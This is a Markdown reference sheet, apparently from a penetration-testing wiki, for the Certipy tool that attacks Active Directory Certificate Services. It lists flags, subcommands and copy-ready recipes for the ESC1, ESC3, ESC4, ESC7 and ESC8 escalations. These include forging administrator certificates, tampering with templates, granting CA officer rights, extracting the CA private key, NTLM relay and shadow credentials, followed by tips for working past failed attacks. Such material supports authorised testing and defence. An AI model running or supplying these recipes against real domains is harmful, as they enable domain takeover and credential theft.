# Certipy

Python toolkit for enumerating and abusing Active Directory Certificate Services (AD CS). Ported and rewritten from the original Certify + PSPKI ideas by Oliver Lyak. On Linux this is the canonical ADCS attack tool.

- Repo: `ly4k/Certipy`
- Install: `pipx install certipy-ad`
- Docs surface: `certipy <command> -h`

For attack-specific playbooks (which ESC does what, when to use each), see [ADCS Attacks](../active-directory/post-compromise/adcs/README.md) and [Shadow Credentials](../active-directory/post-compromise/shadow-credentials.md).

---

## Common auth flags (every subcommand)

| Flag | Purpose |
|---|---|
| `-u user@corp.local` | UPN of authenticating account |
| `-p pass` | Password |
| `-hashes :<NT>` | Pass-the-hash instead of password |
| `-k -no-pass` | Kerberos ticket from `KRB5CCNAME` |
| `-dc-ip <ip>` | Domain controller IP (use it - DNS is often broken from Linux) |
| `-target-ip <ip>` | Force LDAP/SMB target when name resolution fails |
| `-ns <ip>` | Nameserver override |
| `-timeout 30` | Bump on slow labs |
| `-debug` | Verbose - very useful when a request fails silently |

---

## Subcommands

### `certipy find` - enumerate CAs and templates

The always-run recon step. Dumps every CA, every template, every ACL, plus flags each vulnerable ESC.

```sh
# Full enumeration - JSON + BloodHound-compatible output
certipy find -u user@corp.local -p pass -dc-ip <DC-IP>

# Just the vulnerable stuff to stdout
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -vulnerable -stdout

# Include templates that are disabled but present (find hidden misconfigs)
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -enabled false

# Output to a specific dir
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -output /tmp/adcs
```

Output files: `<timestamp>_Certipy.txt` (human), `.json` (machine), `.zip` (BloodHound importable).

### `certipy req` - request a certificate

The workhorse. Requests a cert from a template on a CA.

```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template <TEMPLATE>
```

Common request flags:

| Flag | Purpose |
|---|---|
| `-ca CORP-CA` | Target CA name from `certipy find` |
| `-template X` | Target template |
| `-upn user@corp.local` | Supply a SAN UPN (ESC1/2/6) |
| `-dns host.corp.local` | Supply a SAN DNS name (Certifried) |
| `-sid S-1-5-21-...` | Supply a SID (post-May-2022 chains) |
| `-on-behalf-of DOM\user -pfx agent.pfx` | ESC3 enroll-on-behalf-of |
| `-key-size 4096` | Bigger keypair (rare need) |
| `-retrieve <id>` | Fetch a previously-approved pending request |
| `-out administrator` | Custom output filename base |

### `certipy auth` - PKINIT with a cert

Consumes a `.pfx` and returns a TGT + NT hash (via UnPAC-the-hash).

```sh
# Standard - PKINIT to KDC, prints TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

# Old DC / no PKINIT support - Schannel LDAP shell instead
certipy auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell

# Force UPN when it can't be auto-detected from the cert
certipy auth -pfx cert.pfx -dc-ip <DC-IP> -username administrator -domain corp.local

# Save the credential cache for use with impacket
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
export KRB5CCNAME=administrator.ccache
```

### `certipy template` - modify a template (ESC4)

Requires write on the template. Backs up, mutates to ESC1-vulnerable, and can restore.

```sh
# Make ESC1-vulnerable + save the original config
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate -save-old

# Restore from the saved JSON
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate -configuration VulnerableTemplate.json
```

### `certipy ca` - CA-level operations (ESC7)

Requires `ManageCA` or `ManageCertificates` on the CA object.

```sh
# List CA config + officers + templates
certipy ca -ca CORP-CA -u user@corp.local -p pass -list-officers

# Grant self officer rights
certipy ca -ca CORP-CA -u user@corp.local -p pass -add-officer user

# Enable a template on the CA (e.g. SubCA for ESC7)
certipy ca -ca CORP-CA -u user@corp.local -p pass -enable-template SubCA

# Approve a pending/denied request
certipy ca -ca CORP-CA -u user@corp.local -p pass -issue-request <id>

# Retrieve backup of the CA private key (with sufficient rights - big deal)
certipy ca -ca CORP-CA -u user@corp.local -p pass -backup
```

### `certipy shadow` - msDS-KeyCredentialLink abuse

See [Shadow Credentials](../active-directory/post-compromise/shadow-credentials.md).

```sh
# One-shot: add key, PKINIT, cleanup
certipy shadow auto -u user@corp.local -p pass -dc-ip <DC-IP> -account TARGET

# Manual sub-ops
certipy shadow add    ...
certipy shadow list   ...
certipy shadow remove -device-id <GUID> ...
certipy shadow clear  ...
```

### `certipy account` - computer account management

Uses `MachineAccountQuota` to create/take-over computer accounts (foundation for Certifried and shadow-cred chains on machines).

```sh
# Create
certipy account create -u user@corp.local -p pass -dc-ip <DC-IP> \
  -user pwn$ -pass 'Password123!' -dns pwn.corp.local

# Modify dNSHostName (Certifried)
certipy account update -u pwn$@corp.local -p 'Password123!' -dc-ip <DC-IP> \
  -user pwn$ -dns dc01.corp.local

# Delete
certipy account delete -u user@corp.local -p pass -dc-ip <DC-IP> -user pwn$
```

### `certipy cert` - format conversions

```sh
# .pfx -> cert-only .crt
certipy cert -pfx cert.pfx -nokey -out cert.crt

# .pfx -> key-only
certipy cert -pfx cert.pfx -nocert -out cert.key

# Combine a raw cert + key into a .pfx
certipy cert -cert-pem cert.crt -key-pem cert.key -export -out cert.pfx
```

For manual openssl equivalents, see [ADCS Attacks - Working with .pfx Files](../active-directory/post-compromise/adcs/README.md#working-with-pfx-files).

---

## Full attack recipes (quick lookup)

```sh
# ESC1/2/6 - SAN abuse
certipy req -u u@d -p p -dc-ip DC -ca CA -template T -upn administrator@d
certipy auth -pfx administrator.pfx -dc-ip DC

# ESC3 - enrollment agent
certipy req -u u@d -p p -dc-ip DC -ca CA -template EATemplate
certipy req -u u@d -p p -dc-ip DC -ca CA -template UserTemplate \
  -on-behalf-of 'D\administrator' -pfx u.pfx
certipy auth -pfx administrator.pfx -dc-ip DC

# ESC4 - template write
certipy template -u u@d -p p -dc-ip DC -template T -save-old
# then ESC1 flow, then restore
certipy template -u u@d -p p -dc-ip DC -template T -configuration T.json

# ESC7 - CA officer
certipy ca -ca CA -u u@d -p p -add-officer u
certipy ca -ca CA -u u@d -p p -enable-template SubCA
certipy req -u u@d -p p -dc-ip DC -ca CA -template SubCA -upn administrator@d
certipy ca -ca CA -u u@d -p p -issue-request <id>
certipy req -u u@d -p p -dc-ip DC -ca CA -retrieve <id>
certipy auth -pfx administrator.pfx -dc-ip DC

# ESC8 - relay
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# coerce -> cert -> certipy auth

# Shadow credentials (any GenericWrite target)
certipy shadow auto -u u@d -p p -dc-ip DC -account TARGET
```

---

## Failure modes and workarounds

| Symptom | Cause | Fix |
|---|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP` on `certipy auth` | DC enforces SID extension (post-May-2022) and cert has no SID | Chain ESC9/10/16, or supply `-sid` at request time |
| `KRB_AP_ERR_SKEW` | Clock drift | `sudo ntpdate <DC-IP>` |
| `certipy find` empty / errors | LDAP over 636 blocked or CA offline | Try `-scheme ldap` (unsigned) or verify CA with `-scheme http` |
| `SSPI` / `SEC_E_INVALID_TOKEN` on request | Kerberos required for auth | Use `-k` with a valid ccache |
| Request succeeds but auth fails | Missing Client Auth EKU on template | Not exploitable - find another template |
| PKINIT works but nxc PTH fails | Cached ticket in `KRB5CCNAME` overriding | `unset KRB5CCNAME` or `kdestroy` |

---

## Related

- [Certify.exe](certify.md) - Windows-native equivalent
- [ADCS Attacks](../active-directory/post-compromise/adcs/README.md) - per-ESC playbooks
- [Shadow Credentials](../active-directory/post-compromise/shadow-credentials.md) - `certipy shadow`
- [Rubeus](rubeus.md) - Windows-side PKINIT client
